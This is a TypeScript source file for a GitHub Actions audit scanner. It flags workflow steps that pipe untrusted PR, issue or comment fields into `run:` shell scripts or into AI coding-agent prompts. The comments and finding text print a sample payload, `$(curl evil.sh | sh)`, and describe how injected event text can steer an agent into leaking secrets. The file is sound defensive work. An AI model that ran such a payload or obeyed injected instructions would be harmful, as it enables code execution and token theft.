/**
 * Native script-injection pre-filer for the github-actions-audit template
 * (Issue #2503, part of #2497).
 *
 * Deterministically flags `run:` steps that interpolate an
 * attacker-controllable `${{ github.* }}` context expression directly into
 * the shell — the statically-decidable core of v7 prompt check #22
 * (script injection via untrusted `${{ github.* }}` in `run:` steps,
 * Issue #2350).
 *
 * Issue #3313 (parent #3309) extends the same allow-list to a second sink:
 * an **AI coding-agent action** (`anthropics/claude-code-action`, Copilot,
 * Gemini CLI, …) that receives an attacker-controllable `${{ github.* }}`
 * field through its `with:` inputs (`prompt:`, `direct_prompt:`, `args:`,
 * …). This is the GitLost prompt-injection vector: untrusted event text
 * (an issue body, comment, or PR title) piped straight into an autonomous
 * agent's prompt. The two sinks share the same attacker-controllable field
 * allow-list; only the enclosing step shape differs.
 *
 * The danger: a `${{ … }}` expression is expanded **before** the shell
 * runs, so shell metacharacters in an attacker-controlled value execute as
 * code. A pull request titled `$(curl evil.sh | sh)` interpolated into
 * `run: echo "Title: ${{ github.event.pull_request.title }}"` achieves RCE
 * on the runner.
 *
 * Scope — deliberately narrow (favour precision over recall, per #2503):
 *   - Only the literal `${{ github.<field> }}`-into-`run:` core is flagged.
 *   - The attacker-controllable allow-list and the trusted-field exclusion
 *     set are encoded verbatim from v7 check #22 (see the frozen constants
 *     below). A `run:` step is flagged only when it interpolates a field on
 *     the allow-list that is not on the exclusion set.
 *   - The broader injection family (privileged-trigger justification #6,
 *     PWN-request #10/#26, cache poisoning #28, AI-action trust #29) stays
 *     with the LLM prompt.
 *
 * Stable id is `BP-INJECTION-<workflow-basename>-<job>-<step-index>`. The
 * `BP-` prefix is required: `idle_task_snapshot.listKnownOpenFindingIds`
 * defaults `idPrefix` to `BP-`, so a non-`BP-` id silently breaks dedup
 * and the LLM re-files.
 *
 * Severity is `high` — this is the direct-RCE class (v7.md ~line 539).
 *
 * Pure aside from reading the already-parsed/raw `WorkflowFile` — callers
 * read the files via `readWorkflowFiles`.
 *
 * Australian English throughout (behaviour, organisation, authorised).
 */

import {
  isFindingSuppressed,
  type WorkflowFile,
  type WorkflowFindingSeverity,
} from "./workflow_scan_common.ts";
import { isAiAction, normaliseUses } from "./ai_action_identifiers.ts";

// ---------------------------------------------------------------------------
// v7 check #22 field lists — encoded verbatim (v7.md ~507-524).
// Keep these in lockstep with prompts/github_actions_audit/prompt.md so the
// native pre-filer and the LLM #22 check agree.
// ---------------------------------------------------------------------------

/**
 * Attacker-controllable context fields (v7.md ~507-518). An external
 * contributor can set each of these, so interpolating one into a `run:`
 * shell is a script-injection risk. `github.event.commits.*.message`
 * carries a wildcard index — matched for both `[n]` and `.*`/`.n` forms.
 */
export const ATTACKER_CONTROLLABLE_FIELDS: readonly string[] = Object.freeze([
  "github.event.pull_request.title",
  "github.event.pull_request.body",
  "github.event.pull_request.head.ref",
  "github.event.pull_request.head.label",
  "github.event.issue.title",
  "github.event.issue.body",
  "github.event.comment.body",
  "github.event.review.body",
  "github.event.commits.*.message",
  "github.event.workflow_run.head_branch",
  "github.event.workflow_run.head_sha",
  "github.event.discussion.title",
  "github.event.discussion.body",
  "github.head_ref",
]);

/**
 * Trusted context fields (v7.md ~520-524) the attacker cannot control.
 * Interpolating one of these is never a script-injection finding. The set
 * is applied as a defensive exclusion: a field that somehow appears on
 * both lists is treated as trusted and never flagged.
 */
export const TRUSTED_FIELDS: readonly string[] = Object.freeze([
  "github.sha",
  "github.run_id",
  "github.repository",
  "github.workflow",
  "github.actor",
]);

const TRUSTED_SET: ReadonlySet<string> = new Set(TRUSTED_FIELDS);

/** One attacker-controllable field plus its precompiled matcher. */
interface FieldMatcher {
  /** Canonical allow-list string for the finding prose. */
  field: string;
  /** Matches a complete reference to `field` inside an expression. */
  regex: RegExp;
}

/**
 * Build a bounded matcher for one allow-list field. Bounded so a longer
 * sibling (e.g. `.titles`) or a deeper path never matches a shorter field.
 * Patterns are linear (no nested quantifiers) so adversarial workflow
 * content cannot trigger catastrophic backtracking.
 */
function buildFieldRegex(field: string): RegExp {
  if (field.includes("*")) {
    // github.event.commits.*.message — index form [n], object-filter .*,
    // or dotted .n.
    return /(?<![\w.])github\.event\.commits(?:\[\s*\d+\s*\]|\.\*|\.\d+)\.message(?![\w.[])/;
  }
  // Escape every regex metacharacter, not just `.`, so the matcher stays
  // a literal even if the allow-list grows. `field` is always one of the
  // frozen ATTACKER_CONTROLLABLE_FIELDS compile-time constants — never
  // user-controlled — so the construction is ReDoS-safe.
  const escaped = field.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  // nosemgrep: javascript.lang.security.audit.detect-non-literal-regexp.detect-non-literal-regexp
  return new RegExp(`(?<![\\w.])${escaped}(?![\\w.\\[])`);
}

const FIELD_MATCHERS: readonly FieldMatcher[] = Object.freeze(
  ATTACKER_CONTROLLABLE_FIELDS.map((field) => ({
    field,
    regex: buildFieldRegex(field),
  })),
);

// ---------------------------------------------------------------------------
// Finding type
// ---------------------------------------------------------------------------

/**
 * Which sink an injection finding was raised against:
 *   - `"run"` — an attacker-controllable field interpolated into a
 *     `run:` shell script (the original v7 check #22 core).
 *   - `"ai-prompt"` — an attacker-controllable field passed through an AI
 *     coding-agent action's `with:` inputs (the GitLost vector, #3313).
 */
export type InjectionSink = "run" | "ai-prompt";

/** A single script-injection finding for one workflow step. */
export interface RunInjectionFinding {
  /**
   * Stable id. `BP-INJECTION-<basename>-<job>-<step-index>` for a `run:`
   * sink, `BP-AI-INJECTION-<basename>-<job>-<step-index>` for the
   * AI-action prompt sink (distinct so the two never collide on a step
   * that is both — which cannot happen, but keeps ids unambiguous).
   */
  findingId: string;
  /** Which sink this finding was raised against. */
  sink: InjectionSink;
  /**
   * Normalised `owner/name` of the AI action (`ai-prompt` sink only);
   * `undefined` for a `run:` sink.
   */
  aiAction?: string;
  /** Repo-relative workflow path, e.g. `.github/workflows/ci.yml`. */
  workflowPath: string;
  /** Job name the step belongs to. */
  job: string;
  /** 0-based index of the step within the job's `steps` array. */
  stepIndex: number;
  /** Attacker-controllable fields interpolated into this step. */
  fields: string[];
  /** Always `high` — the direct-RCE class (v7.md ~line 539). */
  severity: WorkflowFindingSeverity;
  /** Issue title (carries the severity emoji prefix). */
  title: string;
  /** File the finding is raised against (the workflow path). */
  file: string;
  /** Best-effort 1-based line number for the cited location. */
  lines: number;
  /** `## Why this matters` rationale. */
  whyItMatters: string;
  /** `## Suggested fix` guidance. */
  suggestedFix: string;
  /** `## Evidence` block. */
  evidence: string;
}

/** Options for {@link scanRunInjection}. */
export interface ScanRunInjectionOptions {
  /** Stable ids suppressed by prior triage — skip these findings. */
  suppressedIds?: Iterable<string>;
  /** Stable ids already open as findings — skip these findings. */
  knownOpenFindingIds?: Iterable<string>;
}

const HIGH_EMOJI = "🔴";

function isRecord(value: unknown): value is Record<string, unknown> {
  return value !== null && typeof value === "object" && !Array.isArray(value);
}

/** Slugify a path fragment into `[a-z0-9-]` for the stable id. */
function slugify(value: string): string {
  return value
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+|-+$/g, "");
}

/** Strip directory and extension from a workflow path → bare basename. */
function workflowBasename(path: string): string {
  const base = path.slice(path.lastIndexOf("/") + 1);
  const dot = base.lastIndexOf(".");
  return dot > 0 ? base.slice(0, dot) : base;
}

/** Match a `${{ … }}` expression block, capturing the inner expression. */
const EXPR_BLOCK = /\$\{\{(.*?)\}\}/gs;

/**
 * Return the attacker-controllable fields interpolated into `runText`,
 * de-duplicated and in allow-list order. A field on the trusted exclusion
 * set is never returned even if it appears on the allow-list.
 *
 * Only `${{ … }}` expression blocks are inspected, so a field name that
 * appears as plain shell text (not inside an expression) is ignored.
 *
 * Pure — no I/O.
 */
export function findInjectedFields(runText: string): string[] {
  const found = new Set<string>();
  EXPR_BLOCK.lastIndex = 0;
  let m: RegExpExecArray | null;
  while ((m = EXPR_BLOCK.exec(runText)) !== null) {
    const expr = m[1] ?? "";
    for (const matcher of FIELD_MATCHERS) {
      if (TRUSTED_SET.has(matcher.field)) continue; // trusted wins
      if (matcher.regex.test(expr)) found.add(matcher.field);
    }
  }
  // Preserve allow-list order for deterministic output.
  return ATTACKER_CONTROLLABLE_FIELDS.filter((f) => found.has(f));
}

/**
 * Return the attacker-controllable fields interpolated into any string
 * value of an AI action's `with:` block, de-duplicated and in allow-list
 * order. Every string input is inspected (agent actions expose the prompt
 * under differing keys — `prompt`, `direct_prompt`, `args`, …), and a
 * list-valued input (e.g. `args:` as a YAML sequence) has each string
 * element inspected. Only `${{ … }}` expression blocks are considered, so
 * a trusted field is never returned (the trusted exclusion applies via
 * {@link findInjectedFields}).
 *
 * Pure — no I/O.
 */
export function findInjectedWithFields(
  withBlock: Record<string, unknown>,
): string[] {
  const found = new Set<string>();
  for (const value of Object.values(withBlock)) {
    if (typeof value === "string") {
      for (const f of findInjectedFields(value)) found.add(f);
    } else if (Array.isArray(value)) {
      for (const el of value) {
        if (typeof el !== "string") continue;
        for (const f of findInjectedFields(el)) found.add(f);
      }
    }
  }
  return ATTACKER_CONTROLLABLE_FIELDS.filter((f) => found.has(f));
}

/**
 * Best-effort 1-based line of the first raw-text line that interpolates
 * one of `fields` inside a `${{ … }}` block. Falls back to 1.
 */
function lineOfFirstInjection(
  lines: readonly string[],
  fields: readonly string[],
): number {
  const matchers = FIELD_MATCHERS.filter((mm) => fields.includes(mm.field));
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i] as string;
    if (!line.includes("${{")) continue;
    for (const matcher of matchers) {
      if (matcher.regex.test(line)) return i + 1;
    }
  }
  return 1;
}

/**
 * Scan every workflow file for `run:` steps that interpolate an
 * attacker-controllable `${{ github.* }}` field and return one
 * {@link RunInjectionFinding} per affected step.
 *
 * Behaviour:
 *   - Only `kind === "workflow"` files are scanned — `jobs.*.steps[]` is a
 *     workflow concept (composite actions use `runs.steps`).
 *   - Unparseable workflows (parsed `null`) and non-record roots yield no
 *     finding.
 *   - A finding suppressed by an in-source `best-practice-ignore:
 *     BP-INJECTION-…` marker near its cited line is dropped.
 *   - Findings whose stable id appears in `suppressedIds` or
 *     `knownOpenFindingIds` are dropped (the LLM / a prior run owns them).
 *
 * Findings are returned sorted by stable id for deterministic output.
 *
 * Pure aside from reading the already-parsed/raw `WorkflowFile` — callers
 * read the files via `readWorkflowFiles`.
 */
export function scanRunInjection(
  files: readonly WorkflowFile[],
  opts: ScanRunInjectionOptions = {},
): RunInjectionFinding[] {
  const suppressed = new Set(opts.suppressedIds ?? []);
  const knownOpen = new Set(opts.knownOpenFindingIds ?? []);
  const findings: RunInjectionFinding[] = [];

  for (const file of files) {
    if (file.kind !== "workflow") continue;
    if (!isRecord(file.parsed)) continue;
    const jobs = file.parsed.jobs;
    if (!isRecord(jobs)) continue;

    const basename = slugify(workflowBasename(file.path));
    const lines = file.rawText.split("\n");

    for (const [jobName, jobValue] of Object.entries(jobs)) {
      if (!isRecord(jobValue)) continue;
      const steps = jobValue.steps;
      if (!Array.isArray(steps)) continue;

      for (let stepIndex = 0; stepIndex < steps.length; stepIndex++) {
        const step = steps[stepIndex];
        if (!isRecord(step)) continue;

        // Sink 1 — attacker-controllable field interpolated into `run:`.
        const run = step.run;
        if (typeof run === "string") {
          const fields = findInjectedFields(run);
          if (fields.length > 0) {
            const findingId = `BP-INJECTION-${basename}-${
              slugify(jobName)
            }-${stepIndex}`;
            const line = lineOfFirstInjection(lines, fields);
            if (
              !suppressed.has(findingId) && !knownOpen.has(findingId) &&
              !isFindingSuppressed(file.rawText, line, findingId, file.path)
            ) {
              findings.push(
                buildRunFinding(
                  file,
                  findingId,
                  jobName,
                  stepIndex,
                  fields,
                  line,
                ),
              );
            }
          }
        }

        // Sink 2 — attacker-controllable field passed through an AI
        // coding-agent action's `with:` inputs (the GitLost vector).
        const uses = step.uses;
        if (typeof uses === "string" && isAiAction(uses)) {
          const withBlock = step.with;
          if (isRecord(withBlock)) {
            const fields = findInjectedWithFields(withBlock);
            if (fields.length > 0) {
              const findingId = `BP-AI-INJECTION-${basename}-${
                slugify(jobName)
              }-${stepIndex}`;
              const line = lineOfFirstInjection(lines, fields);
              if (
                !suppressed.has(findingId) && !knownOpen.has(findingId) &&
                !isFindingSuppressed(file.rawText, line, findingId, file.path)
              ) {
                findings.push(
                  buildAiPromptFinding(
                    file,
                    findingId,
                    jobName,
                    stepIndex,
                    fields,
                    line,
                    normaliseUses(uses),
                  ),
                );
              }
            }
          }
        }
      }
    }
  }

  findings.sort((a, b) => a.findingId.localeCompare(b.findingId));
  return findings;
}

/** Render the attacker-field list as inline-code, comma-separated. */
function renderFieldList(fields: readonly string[]): string {
  return fields.map((f) => `\`${f}\``).join(", ");
}

function buildRunFinding(
  file: WorkflowFile,
  id: string,
  job: string,
  stepIndex: number,
  fields: string[],
  line: number,
): RunInjectionFinding {
  const fieldList = renderFieldList(fields);
  const exampleField = fields[0] as string;
  const envName = "UNTRUSTED_INPUT";

  return {
    findingId: id,
    sink: "run",
    workflowPath: file.path,
    job,
    stepIndex,
    fields,
    severity: "high",
    title: `${HIGH_EMOJI} Job \`${job}\` step ${stepIndex} interpolates ` +
      `untrusted \`\${{ github.* }}\` into \`run:\` (\`${file.path}\`)`,
    file: file.path,
    lines: line,
    whyItMatters: `Job \`${job}\` step ${stepIndex} interpolates the ` +
      `attacker-controllable field${fields.length > 1 ? "s" : ""} ` +
      `${fieldList} directly into a \`run:\` shell script. A \`\${{ … }}\` ` +
      "expression is expanded **before** the shell runs, so shell " +
      "metacharacters in the value execute as code. An external " +
      "contributor who sets that field to `$(curl evil.sh | sh)` (or a " +
      "backtick command) achieves remote code execution on the runner — " +
      "with the workflow's `GITHUB_TOKEN` and any secrets in scope.",
    suggestedFix:
      "Pass the value through a step- or job-level `env:` variable and " +
      "reference it as a quoted shell variable, which the runner never " +
      "re-parses as an expression:\n\n```yaml\n    env:\n" +
      `      ${envName}: \${{ ${exampleField} }}\n` +
      `    run: echo "$${envName}"\n\`\`\``,
    evidence: `\`${file.path}\`:${line} — \`run:\` interpolates ${fieldList}`,
  };
}

function buildAiPromptFinding(
  file: WorkflowFile,
  id: string,
  job: string,
  stepIndex: number,
  fields: string[],
  line: number,
  aiAction: string,
): RunInjectionFinding {
  const fieldList = renderFieldList(fields);

  return {
    findingId: id,
    sink: "ai-prompt",
    aiAction,
    workflowPath: file.path,
    job,
    stepIndex,
    fields,
    severity: "high",
    title: `${HIGH_EMOJI} Job \`${job}\` step ${stepIndex} feeds untrusted ` +
      `\`\${{ github.* }}\` into AI action \`${aiAction}\` (\`${file.path}\`)`,
    file: file.path,
    lines: line,
    whyItMatters: `Job \`${job}\` step ${stepIndex} passes the ` +
      `attacker-controllable field${fields.length > 1 ? "s" : ""} ` +
      `${fieldList} into the \`with:\` inputs of the AI coding-agent ` +
      `action \`${aiAction}\`. Untrusted event text (an issue body, ` +
      "comment, or PR title) reaching an autonomous agent's prompt is a " +
      "prompt-injection vector — the GitLost class: an attacker embeds " +
      "instructions in the event text that steer the agent into " +
      "exfiltrating secrets or the repository token, or into taking " +
      "privileged actions on their behalf, all with the workflow's " +
      "`GITHUB_TOKEN` and any secrets in scope.",
    suggestedFix:
      "Do not pass raw `github.event.*` text into an agent prompt. If the " +
      "workflow must react to event content, gate it behind an " +
      "author-association / same-repo guard, scope the job's " +
      "`permissions:` and `GITHUB_TOKEN` to the minimum, withhold repo " +
      "and org secrets from the agent step, and treat the event text as " +
      "untrusted data the agent may summarise but never obey. Prefer a " +
      "separate minimal-privilege workflow for handling untrusted " +
      "contributor input.",
    evidence: `\`${file.path}\`:${line} — AI action \`${aiAction}\` ` +
      `\`with:\` receives ${fieldList}`,
  };
}
